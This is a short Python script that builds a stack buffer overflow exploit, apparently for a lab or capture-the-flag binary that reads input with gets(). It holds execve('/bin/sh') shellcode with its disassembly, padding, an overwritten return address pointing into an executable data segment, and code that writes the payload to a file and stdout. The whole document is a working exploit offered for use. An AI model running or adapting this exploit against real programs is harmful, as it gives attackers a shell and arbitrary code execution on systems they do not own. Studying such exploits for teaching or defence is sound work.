#!/usr/bin/python
import sys
import struct

'''
08048060 <_start>:
        8048060: 31 c0                 xor    eax, eax          eax <- 0
        8048062: 50                    push   eax               push 0
        8048063: 68 2f 2f 73 68        push   0x68732f2f        push "//sh"     
        8048068: 68 2f 62 69 6e        push   0x6e69622f        push "/bin"
        804806d: 89 e3                 mov    ebx, esp          ebx <- esp
        804806f: 89 c1                 mov    ecx, eax          ecx <- 0
        8048071: 89 c2                 mov    edx, eax          edx <- 0
        8048073: b0 0b                 mov    al, 0xb           eax <- 11
        8048075: cd 80                 int    0x80              syscall (execve("/bin/sh", 0, 0))
        8048077: 31 c0                 xor    eax, eax          eax <- 0
        8048079: 40                    inc    eax               eax <- 1
        804807a: cd 80                 int    0x80              syscall (exit())
'''
# original padding to overwrite EIP
padding = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL'

# Executable data segment
eip = struct.pack("I", 0x80dacc0)

# payload - execve("/bin/sh")
payload = b'\x31\xc0\x50\x68\x2f\x2f\x73'
payload += b'\x68\x68\x2f\x62\x69\x6e\x89'
payload += b'\xe3\x89\xc1\x89\xc2\xb0\x0b'
payload += b'\xcd\x80\x31\xc0\x40\xcd\x80'

# junk to overwrite eip address
junk =  b"A" * (len(padding) - len(payload))
# the whole exploit
# add a newline to trigger gets()
exploit = payload + junk + eip + b"\n"

with open("greeter_input", "wb") as f:
    f.write(exploit)
# print immedietly with no encoding
sys.stdout.buffer.write(exploit)
sys.stdout.buffer.flush()


